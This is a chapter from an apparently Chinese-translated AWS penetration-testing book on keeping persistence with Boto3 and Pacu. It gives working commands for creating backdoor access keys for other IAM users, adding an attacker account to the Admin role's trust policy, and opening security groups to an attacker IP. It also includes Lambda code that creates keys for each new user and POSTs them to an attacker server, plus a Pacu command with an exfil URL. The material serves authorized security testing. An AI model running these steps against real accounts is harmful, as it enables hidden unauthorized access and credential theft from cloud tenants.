# 第十一章：使用 Boto3 和 Pacu 维持 AWS 持久性

在 AWS 环境中建立持久性允许您保持特权访问，即使在您的主动攻击被检测到并且您对环境的主要访问方式被关闭的情况下。并不总是可能完全保持低调，所以在我们被抓到的情况下，我们需要一个备用计划（或两个，或三个，或……）。理想情况下，这个备用计划是隐蔽的，以便在需要再次访问环境时建立和执行。

有许多与恶意软件、逃避和持久性相关的技术和方法论可以应用到本章，但我们将专注于在 AWS 中可以滥用的不同方法，而不一定是整个红队风格的渗透测试的方法论。在 AWS 中的持久性技术与传统的持久性类型有很大不同，比如在 Windows 服务器上，但这些技术（正如我们已经知道的）也可以应用于我们攻击的 AWS 环境中的任何服务器。

在本章中，我们将专注于实际 AWS 环境中的持久性，而不是环境中的服务器。这些类型的持久性包括后门用户凭据、后门角色信任关系、后门 EC2 安全组、后门 Lambda 函数等等。

在本章中，我们将涵盖以下主题：

+   后门用户凭据

+   后门角色信任关系

+   后门 EC2 安全组

+   使用 Lambda 函数作为持久性看门狗

# 后门用户

在我们开始之前，让我们定义一下后门到底是什么。在本章的背景下，它的意思几乎与字面上的意思相同，即我们正在打开一个后门进入环境，以便在前门关闭时，我们仍然可以进入。在 AWS 中，后门可以是本章中涵盖的任何一种东西，前门将是我们对环境的主要访问方式（即被攻破的 IAM 用户凭据）。我们希望我们的后门能够在我们的妥协被防御者检测到并关闭被攻破的用户的情况下持续存在，因为在这种情况下，我们仍然可以通过后门进入。

正如我们在之前的章节中反复演示和使用的那样，IAM 用户可以设置访问密钥 ID 和秘密访问密钥，允许他们访问 AWS API。最佳实践通常是使用替代的身份验证方法，比如单点登录（SSO），它授予对环境的临时联合访问，但并非总是遵循最佳实践。我们将继续使用与之前章节中相似的场景，我们在那里拥有一个 IAM 用户`Test`的凭据。我们还将继续使用我们的用户通过特权升级获得对环境的管理员级别访问的想法，这是我们在第十章中利用的特权升级 AWS 账户使用被盗的密钥、Boto3 和 Pacu。

# 多个 IAM 用户访问密钥

账户中的每个 IAM 用户有两对访问密钥的限制。我们的测试用户已经创建了一个，所以在我们达到限制之前还可以创建一个。考虑到我们一直在使用的密钥是别人的，我们碰巧获得了对它们的访问，我们可以使用的一种简单的持久性形式就是为我们的用户创建第二组密钥。这样做，我们将拥有同一个用户的两组密钥：一组是我们被攻破的，另一组是我们自己创建的。

然而，这有点太简单了，因为如果我们被检测到，防御方的人员只需移除我们的用户，就可以一举删除我们对环境的两种访问方法。相反，我们可以选择针对环境中的不同特权用户创建我们的后门密钥。

首先，我们想要查看账户中存在哪些用户，所以我们将运行以下 AWS CLI 命令：

```
aws iam list-users --profile Test
```

该命令将返回账户中每个 IAM 用户的一些标识信息。这些用户中的每一个都是我们后门密钥的潜在目标，但我们需要考虑已经有两组访问密钥的用户。如果一个用户已经有两组密钥，而有人尝试创建第三组，API 将抛出一个错误，这可能会对倾听的捍卫者产生很大的噪音，最终使我们被抓住。

我想针对用户`Mike`进行操作，他是我们 AWS CLI 命令返回的用户之一。在尝试给`Mike`添加访问密钥之前，我将通过以下命令检查他是否已经有两组访问密钥：

```
aws iam list-access-keys --user-name Mike --profile Test 
```

以下截图显示了该命令的输出，以及`Mike`已经有两组访问密钥：

![](img/3632ae0c-963e-44bc-bfda-da9d5f7d52af.png)

图 1：列出 Mike 的访问密钥显示他已经有两组

这意味着我们不应该针对`Mike`进行操作。这是因为尝试创建另一组密钥将失败，导致 AWS API 出现错误。一个自以为是的捍卫者可能能够将该错误与您的恶意活动相关联，最终使您被抓住。

之前出现过另一个用户名为`Sarah`的用户，所以让我们来检查她设置了多少个访问密钥：

```
aws iam list-access-keys --user-name Sarah --profile Test
```

这一次，结果显示为空数组，这表明`Sarah`没有设置访问密钥：

![](img/cf323cea-9d65-4a23-a590-6c264ce137ff.png)

图 2：当我们尝试列出 Sarah 的时候，没有访问密钥显示出来

现在我们知道我们可以针对`Sarah`进行持久化，所以让我们运行以下命令来创建一对新的密钥：

```
aws iam create-access-key --user-name Sarah --profile Test
```

响应应该类似于以下截图：

![](img/f9abfe8b-34b8-499b-b8ba-b2525f62a482.png)

图 3：属于 Sarah 的访问密钥 ID 和秘密访问密钥

现在我们可以使用返回的密钥来访问与`Sarah`相关的任何权限。请记住，这种方法可以用于特权升级，以及在您的初始访问用户权限较低的情况下进行持久化，但`iam:CreateAccessKey`是其中之一。

让我们将`Sarah`的凭据存储在本地，以便我们在此期间不需要担心它们。为此，我们可以运行以下命令：

```
aws configure --profile Sarah
```

然后我们可以填写我们被提示的值。同样，我们可以使用`set_keys`命令将这些密钥添加到 Pacu 中。

# 使用 Pacu 进行操作

Pacu 还有一个模块可以为我们自动完成整个过程。这个模块称为`iam__backdoor_users_keys`模块，自动完成了我们刚刚进行的过程。要尝试它，请在 Pacu 中运行以下命令：

```
run iam__backdoor_users_keys 
```

默认情况下，我们将得到一个用户列表供选择，但也可以在原始命令中提供用户名。

现在当我们的原始访问环境被发现时，我们有了一个（希望是高特权的）用户的备份凭据。如果我们愿意，我们可以使用之前章节的技术来枚举该用户的权限。

# 后门角色信任关系

IAM 角色是 AWS 的一个重要组成部分。简单来说，角色可以被认为是为某人/某物在一段时间内（默认为 1 小时）提供特定权限的。这个某人或某物可以是一个人，一个应用程序，一个 AWS 服务，另一个 AWS 账户，或者任何以编程方式访问 AWS 的东西。

# IAM 角色信任策略

IAM 角色有一个与之关联的文档，称为其信任策略。信任策略是一个 JSON 策略文档（例如 IAM 策略，如`ReadOnlyAccess`或`AdministratorAccess`），指定谁/什么可以假定该角色，以及在什么条件下允许或拒绝。允许 AWS EC2 服务假定某个角色的常见信任策略文档可能如下所示：

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Service": "ec2.amazonaws.com"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

这个策略允许 EC2 服务访问它所属的角色。这个策略可能会在 IAM 角色被添加到 EC2 实例配置文件，然后附加到 EC2 实例时使用。然后，附加角色的临时凭证可以从实例内部访问，EC2 服务将使用它来访问所需的任何内容。

对于我们攻击者来说，IAM 角色的一些特性非常适合我们：

+   角色信任策略可以随意更新

+   角色信任策略可以提供对其他 AWS 账户的访问

就建立持久性而言，这是完美的。这意味着，通常情况下，我们只需要更新目标账户中特权角色的信任策略，就可以在该角色和我们自己的攻击者 AWS 账户之间建立信任关系。

在我们的示例场景中，我们创建了两个 AWS 账户。其中一个（账户 ID `012345678912`）是我们自己的个人攻击者账户，这意味着我们通过 AWS 个人注册了这个账户。另一个（账户 ID `111111111111`）是我们已经获取了密钥的账户。我们想要建立跨账户持久性，以确保我们将来能够访问环境。这意味着即使防御者检测到了我们的入侵，我们仍然可以通过跨账户方法重新访问环境，从而在不打开任何其他安全漏洞的情况下保持对目标环境的访问。

# 寻找合适的目标角色

建立这种持久性的第一步将是找到一个合适的目标角色。并非所有角色都允许你更新它们的信任策略文档，这意味着我们不想以它们为目标。它们通常是服务关联角色，这是一种直接与 AWS 服务关联的独特类型的 IAM 角色（[`docs.aws.amazon.com/IAM/latest/UserGuide/using-service-linked-roles.html`](https://docs.aws.amazon.com/IAM/latest/UserGuide/using-service-linked-roles.html)）。

这些角色可以通过 AWS Web 控制台的 IAM 角色页面以几种不同的方式快速识别。首先，你可能会发现它们的名称以`AWSServiceRoleFor`开头，后面跟着它们所属的 AWS 服务。另一个指示是在角色列表的受信实体列中；它会说类似于`AWS service:<service name>(Service-Linked role)`。如果你看到`Service-Linked role`的说明，那么你就知道你不能更新信任策略文档。最后，所有 AWS 服务关联角色都将包括路径`/aws-service-role/`。其他角色不允许使用该路径创建新角色：

![](img/928e2843-f15c-4672-a0c7-264f13130378.png)

图 4：我们测试账户中的两个服务关联角色

不过不要被骗了！仅仅依靠名称来指示哪些角色是服务角色，你可能会上当。一个完美的例子就是下面的截图，其中显示了角色`AWSBatchServiceRole`：

![](img/d7081826-2480-44ac-aebf-f8a9289b4375.png)

`AWSBatchServiceRole`这个名字显然表明这个角色是一个服务关联角色，对吗？错。如果你注意到，在`AWS service: batch`之后没有`(Service-Linked role)`的说明。所以，这意味着我们可以更新这个角色的信任策略，即使它听起来像是一个服务关联角色。

在我们的测试环境中，我们找到了一个名为`Admin`的角色，这对于攻击者来说应该立即引起`高特权`的警觉，所以我们将以这个角色为目标进行持久性攻击。我们不想在目标环境中搞砸任何事情，所以我们希望将自己添加到信任策略中，而不是用我们自己的策略覆盖它，这可能会在环境中搞砸一些东西。如果我们不小心移除了对某个 AWS 服务的访问权限，依赖于该访问权限的资源可能会开始失败，而我们不希望出现这种情况，有很多不同的原因。

从`iam:GetRole`和`iam:ListRoles`返回的数据应该已经包括我们想要的角色的活动信任策略文档，在 JSON 响应对象的`AssumeRolePolicyDocument`键下。我们要定位的管理员角色如下：

```
{
    "Path": "/",
    "RoleName": "Admin",
    "RoleId": "AROAJTZAUYV2TQBZ2LXUK",
    "Arn": "arn:aws:iam::111111111111:role/Admin",
    "CreateDate": "2018-11-06T18:48:08Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::111111111111:root"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "Description": "",
    "MaxSessionDuration": 3600
}
```

如果我们查看`AssumeRolePolicyDocument` > `Statement`下的值，我们可以看到目前只允许一个主体假定这个角色，即**Amazon 资源名称**（**ARN**）`arn:aws:iam::111111111111:root`。这个 ARN 指的是帐户 ID 为`111111111111`的帐户的根用户，基本上可以翻译为`帐户 ID 111111111111 中的任何资源`。这包括根用户、IAM 用户和 IAM 角色。

# 添加我们的后门访问

我们现在将把我们的攻击者拥有的账户添加为此角色的信任策略。首先，我们将把角色信任策略中`AssumeRolePolicyDocument`键的值保存到本地 JSON 文件（`trust-policy.json`）中。为了向我们自己的账户添加信任而不移除当前的信任，我们可以将`Principal` `AWS`键的值从字符串转换为数组。这个数组将包括已经存在的根 ARN 和我们攻击者账户的根 ARN。`trust-policy.json`现在应该看起来像下面这样：

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": [
                    "arn:aws:iam::111111111111:root",
                    "arn:aws:iam::012345678912:root"
                ]
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

接下来，我们将使用 AWS CLI 更新具有此信任策略的角色：

```
aws iam update-assume-role-policy --role-name Admin --policy-document file://trust-policy.json --profile Test 
```

如果一切顺利，那么 AWS CLI 不应该向控制台返回任何输出。否则，您将看到一个错误和一个简短的描述出了什么问题。如果我们想要确认一切都正确，我们可以使用 AWS CLI 来`get`该角色并再次查看信任策略文档：

```
aws iam get-role --role-name Admin --profile Test 
```

该命令的响应应该包括您刚刚上传的信任策略。

我们唯一需要做的另一件事是将角色的 ARN 保存在本地某个地方，这样我们就不会忘记它。在这个例子中，我们目标角色的 ARN 是`arn:aws:iam::111111111111:role/Admin`。现在一切都完成了。

# 确认我们的访问

我们可以通过尝试从我们自己的攻击者账户内部“假定”我们的目标角色来测试我们的新持久性方法。已经有一个名为`MyPersonalUser`的本地 AWS CLI 配置文件，这是属于我的个人 AWS 账户的一组访问密钥。使用这些密钥，我应该能够运行以下命令：

```
aws sts assume-role --role-arn arn:aws:iam::111111111111:role/Admin --role-session-name PersistenceTest --profile MyPersonalUser 
```

我们只需要提供我们想要凭证的角色的 ARN 和角色会话名称，这可以是与返回的临时凭证关联的任意字符串值。如果一切按计划进行，AWS CLI 应该会以以下类似的方式做出响应：

```
{
    "Credentials": {
        "AccessKeyId": "ASIATE66IJ1KVECXRQRS",
        "SecretAccessKey": "hVhO4zr7gbrVBYS4oJZBTeJeKwTd1bPVWNZ9At7a",
        "SessionToken": "FQoGZXIvYXdzED0aAJslA+vx8iKMwQD0nSLzAaQ6mf4X0tuENPcN/Tccip/sR+aZ3g2KJ7PZs0Djb6859EpTBNfgXHi1OSWpb6mPAekZYadM4AwOBgjuVcgdoTk6U3wQAFoX8cOTa3vbXQtVzMovq2Yu1YLtL3LhcjoMJh2sgQUhxBQKIEbJZomK9Dnw3odQDG2c8roDFQiF0eSKPpX1cI31SpKkKdtHDignTBi2YcaHYFdSGHocoAu9q1WgXn9+JRIGMagYOhpDDGyXSG5rkndlZA9lefC0M7vI5BTldvmImgpbNgkkwi8jAL0HpB9NG2oa4r0vZ7qM9pVxoXwFTA1I8cyf6C+Vvwi5ty/3RaiZ1IffBQ==",
        "Expiration": "2018-11-06T20:23:05Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAJTZAUYV2TQBZ2LXUK:PersistenceTest",
        "Arn": "arn:aws:sts::111111111111:assumed-role/Admin/PersistenceTest"
    }
}
```

完美！现在，我们所做的是使用我们自己的个人账户凭据来检索我们目标 AWS 账户的凭据。只要我们仍然是受信任的实体，我们随时都可以运行相同的`aws sts` API 调用，并在需要时检索另一组临时凭据。

我们可以通过修改我们的`~/.aws/credentials`文件使这些密钥对 AWS CLI 可用。配置文件只需要额外的`aws_session_token`键，这将导致以下内容被添加到我们的凭据文件中：

```
[PersistenceTest]
aws_access_key_id = ASIATE66IJ1KVECXRQRS
aws_secret_access_key = hVhO4zr7gbrVBYS4oJZBTeJeKwTd1bPVWNZ9At7a
aws_session_token = "FQoGZXIvYXdzED0aAJslA+vx8iKMwQD0nSLzAaQ6mf4X0tuENPcN/Tccip/sR+aZ3g2KJ7PZs0Djb6859EpTBNfgXHi1OSWpb6mPAekZYadM4AwOBgjuVcgdoTk6U3wQAFoX8cOTa3vbXQtVzMovq2Yu1YLtL3LhcjoMJh2sgQUhxBQKIEbJZomK9Dnw3odQDG2c8roDFQiF0eSKPpX1cI31SpKkKdtHDignTBi2YcaHYFdSGHocoAu9q1WgXn9+JRIGMagYOhpDDGyXSG5rkndlZA9lefC0M7vI5BTldvmImgpbNgkkwi8jAL0HpB9NG2oa4r0vZ7qM9pVxoXwFTA1I8cyf6C+Vvwi5ty/3RaiZ1IffBQ=="
```

然后我们可以手动将这些凭据添加到 Pacu 中，或者我们可以从 AWS CLI 导入它们到 Pacu 中。

# 使用 Pacu 自动化

就像前一节关于后门用户的部分一样，这一切都可以很容易地自动化！除此之外，它已经为您自动化了，使用`iam__backdoor_assume_role` Pacu 模块。该模块接受三个不同的参数，但我们只会使用其中的两个。`--role-names`参数接受要在我们的目标账户中设置后门的 IAM 角色列表，`--user-arns`参数接受要为每个目标角色添加信任关系的 ARN 列表。如果我们要复制刚刚经历的情景，那么我们将运行以下 Pacu 命令：

```
run iam__backdoor_assume_role --role-names Admin --user-arns arn:aws:iam::012345678912:root 
```

Pacu 将自动设置`Admin`角色的后门，并与我们提供的 ARN 建立信任关系。输出应该看起来像这样：

![](img/7327d803-84a1-4735-b740-444466a00ed2.png)

图 5：运行 Pacu iam__backdoor_assume_role 模块

如果我们不知道我们想要攻击的角色，我们可以省略`--role-names`参数。然后 Pacu 将收集账户中的所有角色，并给我们一个选择列表。

这里有一个相当重要的副注，你可能一直在想，信任策略文档确实接受通配符，比如星号（*）字符！信任策略可以使用通配符，以便任何东西都可以假定该角色，这实际上意味着任何东西。信任每个人拥有 IAM 角色绝不是一个好主意，特别是如果你正在攻击一个账户。你不希望打开环境中原本不存在的门，其他攻击者可能会趁机溜进来。然而，了解通配符角色信任策略的确切含义是很重要的，因为在账户中遇到这样的情况是很少见的。

# EC2 安全组的后门

EC2 安全组充当管理一个或多个 EC2 实例的入站和出站流量规则的虚拟防火墙。通常，你会发现对实例上特定端口的流量被列入白名单，以允许来自其他 IP 范围或安全组的流量。默认情况下拒绝所有访问，可以通过创建新规则来授予访问权限。作为攻击者，我们无法绕过安全组规则，但这并不意味着我们的访问完全被阻止。

我们所需要做的就是向目标安全组添加我们自己的安全组规则。理想情况下，这将是一个允许我们的 IP 地址/范围到安全组适用的实例上的一组端口的规则。你可能认为你想要为所有端口（`0`-`65535`）和所有协议（TCP、UDP 等）添加白名单访问，但一般来说，这是一个坏主意，因为有一些非常基本的检测存在。允许流量到安全组的每个端口被认为是一种不好的做法，因此有许多工具会对这种安全组规则发出警报。

知道检测所有端口都允许入站是典型的最佳实践检查，我们可以将我们的访问精细化到一些常见端口的子集。这些端口可能只是一个较短的范围，比如`0`-`1024`，一个常见端口，比如端口`80`，你知道他们在目标服务器上运行的服务的端口，或者你想要的任何东西。

使用我们同样的`Test`用户，假设我们发现了一个我们想要攻击的 EC2 实例。这可能是通过像下面的 AWS CLI 命令描述当前区域中的 EC2 实例：

```
aws ec2 describe-instances --profile Test 
```

这个命令返回了相当多的信息，但重要的信息是我们目标的实例 ID（`i-08311909cfe8cff10`），我们目标的公共 IP（`2.3.4.5`），以及附加到它的安全组的列表：

```
"SecurityGroups": [
    {
        "GroupName": "corp",
        "GroupId": "sg-0315cp741b51fr4d0"
    }
]
```

有一个附加到目标实例的单个组名为`corp`；我们可以猜测它代表公司。现在我们有了安全组的名称和 ID，但我们想要看看它上面已经存在的规则。我们可以通过运行以下 AWS CLI 命令找到这些信息：

```
aws ec2 describe-security-groups --group-ids sg-0315cp741b51fr4d0 --profile Test 
```

该命令的响应应该显示已添加到安全组的入站和出站规则。响应的`IpPermissions`键包含入站流量规则，`IpPermissionsEgress`键包含出站流量规则。我们目标`corp`安全组的入站流量规则如下：

```
"IpPermissions": [
    {
        "FromPort": 27017,
        "IpProtocol": "tcp",
        "IpRanges": [
            {
                "CidrIp": "10.0.0.1/24"
            }
        ],
        "Ipv6Ranges": [],
        "PrefixListIds": [],
       "ToPort": 27018,
        "UserIdGroupPairs": []
    }
]
```

我们所看到的是允许来自 IP 范围`10.0.0.1/24`到范围`27017`到`27018`的任何端口的入站 TCP 访问。也许你认识这些端口！这些端口通常属于 MongoDB，一种 NoSQL 数据库。问题是访问被列入白名单到一个内部 IP 范围，这意味着我们已经需要在网络中有一个立足点才能访问这些端口。这就是我们将添加我们的后门安全组规则，以便我们可以直接访问 MongoDB 的地方。

为了做到这一点，我们可以使用`ec2:AuthorizeSecurityGroupIngress` API。我们将说我们自己的攻击者 IP 地址是`1.1.1.1`，我们已经知道要打开访问权限的端口，所以我们可以运行以下 AWS CLI 命令：

```
aws ec2 authorize-security-group-ingress --group-id sg-0315cp741b51fr4d0 --protocol tcp --port  27017-27018 --cidr 1.1.1.1/32
```

如果一切顺利，您将不会看到此命令的任何输出，但如果出现问题，将会出现错误。现在我们的后门规则已成功应用，我们所针对的安全组中的每个 EC2 实例现在应该允许我们访问。请记住，可以指定`0.0.0.0/0`作为您的 IP 地址范围，并且它将允许任何 IP 地址访问。作为攻击者，我们绝对不希望这样做，因为这将打开其他攻击者可能发现和滥用的环境入口，因此我们始终要确保即使我们的后门访问规则也是细粒度的。

现在我们可以尝试远程访问 MongoDB，以测试我们的后门规则是否成功，并希望获得对以前私有的 MongoDB 服务器的访问权限。以下屏幕截图显示我们连接到端口`27017`上的 Mongo 数据库，服务器的一些错误配置对我们有利。如屏幕截图的轮廓部分所示，访问控制（身份验证）未设置，这意味着我们可以在不需要凭据的情况下读取和写入数据库。下一条消息显示 Mongo 进程正在以 root 用户身份运行，这意味着如果我们能够在 Mongo 服务器上执行任何文件读取或代码执行，它将以 root 用户身份运行：

![](img/a765957b-d8e1-44fc-afe1-98fc2732d516.png)

就像前面的部分一样，这对您来说可能已经被 Pacu 自动化了！我们可以针对一个或多个安全组，但默认情况下，Pacu 将使用您指定的规则在当前区域中的所有组中设置后门。要复制我们刚刚经历的过程，我们可以运行以下 Pacu 命令（Pacu 使用安全组名称而不是 ID，因此我们提供`corp`）：

```
run ec2__backdoor_ec2_sec_groups --ip 1.1.1.1/32 --port-range 27017-27018 --protocol tcp --groups corp@us-west-2 
```

然后 Pacu 将向目标安全组添加我们的后门规则。但是永远不要忘记`--ip`参数，因为您不希望向世界（`0.0.0.0/0`）打开任何东西。以下屏幕截图显示了前面 Pacu 命令的输出：

![](img/8bbbbcd4-3706-4055-8fa5-69ef058fd30d.png)

图 6：Pacu 在后门公司安全组时的输出

然后，如果您要查看应用于该安全组的规则，您将看到类似于这样的内容：

![](img/9022b74d-78b2-4d7d-b26f-2d16f23e40a1.png)

图 7：我们目标安全组上的后门规则

# 使用 Lambda 函数作为持久看门狗

现在，在帐户中创建我们的持久后门非常有用，但是如果即使这些后门被检测到并从环境中删除了呢？我们可以使用 AWS Lambda 作为看门狗来监视帐户中的活动，并对某些事件做出响应，从而允许我们对防御者的行动做出反应。

基本上，AWS Lambda 是您在 AWS 中运行无服务器代码的方式。简单来说，您上传您的代码（无论是 Node.js、Python 还是其他任何东西），并为您的函数设置一个触发器，当触发器被触发时，您的代码在云中执行并对传入的数据进行处理。

我们攻击者可以利用这一点做很多事情。我们可以用它来警示帐户中的活动：

+   这些活动可能有助于我们利用该帐户

+   这可能意味着我们已经被防御者发现。

Lambda 函数还有很多其他用途，但现在我们将专注于这个。

# 使用 Lambda 自动化凭据外泄

从上一节的第一点开始，我们希望一个 Lambda 函数在可能值得利用的事件上触发。我们将把这与本章前面描述的持久性方法联系起来，因此对于后门 IAM 用户，可能值得利用的事件可能是创建新用户时。我们可以使用 CloudWatch Events 触发我们的 Lambda 函数，然后运行我们的代码，该代码设置为自动向该用户添加一组新的访问密钥，然后将这些凭证外发到我们指定的服务器。

这种情况如下绑定在一起：

1.  攻击者（我们）在目标账户中创建了一个恶意 Lambda 函数

1.  攻击者创建了一个触发器，每当创建新的 IAM 用户时就运行 Lambda 函数

1.  攻击者在他们控制的服务器上设置一个监听器，等待凭证

1.  经过 2 天

1.  环境中的普通用户创建了一个新的 IAM 用户

1.  攻击者的 Lambda 函数被触发

1.  该函数向新创建的用户添加一组访问密钥

1.  该函数使用创建的凭证向攻击者的服务器发出 HTTP 请求

现在攻击者只需坐下来等待凭证流入他们的服务器。

这可能看起来是一个复杂的过程，但简单来说，你可以把它看作是一种持久性建立持久性的方法。我们已经知道如何首先建立持久性，所以 Lambda 增加的是连续执行的能力。

要触发事件的函数，例如创建用户，必须创建一个 CloudWatch Event 规则。CloudWatch Event 规则是一种基本上说——如果我在环境中看到这种情况发生，就执行这个动作的方法。为了使我们的 CloudWatch Event 规则正常工作，我们还需要在`us-east-1`地区启用 CloudTrail 日志记录。这是因为我们是由 IAM 事件（`iam:CreateUser`）触发的，并且 IAM 事件只传递到`us-east-1` CloudWatch Events。在大多数情况下，CloudTrail 日志记录将被启用。最佳做法是在所有 AWS 地区启用它，如果 CloudTrail 未启用，则您可能处于一个不太完善的环境中，需要关注其他问题。

# 使用 Pacu 部署我们的后门

创建后门 Lambda 函数、创建 CloudWatch Events 规则并连接两者的过程可能会很烦人，因此已经自动化并集成到 Pacu 中。

我们将要查看的第一个 Pacu 模块称为`lambda__backdoor_new_users`，它基本上只是自动化了在环境中为新创建的用户创建后门并外发凭证的过程。如果我们查看 Pacu 模块使用的 Lambda 函数的源代码，我们会看到以下内容：

```
import boto3
from botocore.vendored import requests
def lambda_handler(event,context):
 if event['detail']['eventName']=='CreateUser':
 client=boto3.client('iam')
 try:
 response=client.create_access_key(UserName=event['detail']['requestParameters']['userName'])
 requests.post('POST_URL',data={"AKId":response['AccessKey']['AccessKeyId'],"SAK":response['AccessKey']['SecretAccessKey']})
 except:
 pass
 return
```

代码的作用只是检查触发它的事件是否是`iam:CreateUser` API 调用，如果是，它将尝试使用 Python 的`boto3`库为新创建的用户创建凭证。然后一旦成功，它将发送这些凭证到攻击者的服务器，这由`POST_URL`指示（Pacu 在启动函数之前替换该字符串）。

模块的其余代码设置了所有必需的资源，或者删除了它知道您在账户中启动的任何后门，有点像清理模式。

接收我们创建的凭证，我们需要在自己的服务器上启动一个 HTTP 监听器，因为凭证是在请求体中`POST`的。之后，我们只需运行以下 Pacu 命令，希望凭证开始涌入：

```
run lambda__backdoor_new_users --exfil-url http://attacker-server.com/
```

当 Pacu 命令完成时，目标账户现在应该已经设置了我们的 Lambda 后门。只要环境中的其他人创建了一个新的 IAM 用户，我们应该收到一个带有这些凭证的 HTTP 监听器的请求。

以下截图显示了运行`lambda__backdoor_new_users` Pacu 模块的一些输出：

![](img/482885c6-1634-4167-bc6a-5b3a6127c6c0.png)

现在，下一个截图显示了在有人在我们的目标环境中创建用户后，向我们的 HTTP 服务器 POST 的凭据：

![](img/fc4f4128-1065-4292-b803-1dd997d58bcf.png)

我们可以看到访问密钥 ID 和秘密访问密钥都包含在这个 HTTP POST 请求的正文中。现在我们已经为一个用户收集了密钥，如果我们觉得有必要，我们可以删除我们的后门（您不应该在您正在测试的环境中留下任何东西！）。为了做到这一点，我们可以运行以下 Pacu 命令：

```
run lambda__backdoor_new_users --cleanup
```

这个命令应该输出类似以下截图的内容，表明它已经删除了我们之前创建的后门资源：

![](img/e7c1f06d-0048-4c4b-9ae4-753254afac30.png)

# 其他 Lambda Pacu 模块

除了`lambda__backdoor_new_users` Pacu 模块之外，还有另外两个：

+   `lambda__backdoor_new_sec_groups`

+   `lambda__backdoor_new_roles`

`lambda__backdoor_new_sec_groups`模块可以用于在创建新的 EC2 安全组时设置后门，通过将我们自己的 IP 地址列入白名单，而`lambda__backdoor_new_roles`模块将修改新创建角色的信任关系，允许我们跨账户假定它们，然后它将外泄角色的 ARN，以便我们可以继续收集我们的临时凭据。这两个模块都像我们之前介绍的`lambda__backdoor_new_users`模块一样，在 AWS 账户中部署资源，这些资源会根据事件触发，并且它们有清理选项来删除这些资源。

`lambda__backdoor_new_sec_groups`模块使用 EC2 API（而不是 IAM），因此不需要在`us-east-1`中创建 Lambda 函数；相反，它应该在您希望在其中设置新安全组后门的区域中启动。

# 总结

在本章中，我们已经看到了如何在目标 AWS 环境中建立持久访问的方法。这可以直接完成，就像我们展示的那样，比如向其他 IAM 用户添加后门密钥，或者我们可以使用更长期的方法，比如 AWS Lambda 和 CloudWatch Events 等服务。在目标 AWS 账户中，您可以建立各种不同的持久性方式，但有时候只需要对目标进行一些研究，就可以确定一个好的位置。

Lambda 提供了一个非常灵活的平台，可以在我们的目标账户中对事件做出反应和响应，这意味着我们可以在资源创建时建立持久性（或更多）；然而，就像我们通过给 EC2 安全组设置后门所展示的那样，并不是每个后门都需要基于/在 IAM 服务中，并且有时候可以成为其他类型访问的后门。本章旨在展示一些常见的持久性方法，以帮助您发现在您的工作中其他持久性方法。

与在账户中创建新资源（可能会引起注意）不同，也可以对现有的 Lambda 函数设置后门。这些攻击对您所针对的环境更具体，并且需要不同的权限集，但可以更隐蔽和持久。这些方法将在下一章中讨论，我们将讨论 AWS Lambda 的渗透测试，调查现有 Lambda 函数的后门和数据外泄等。
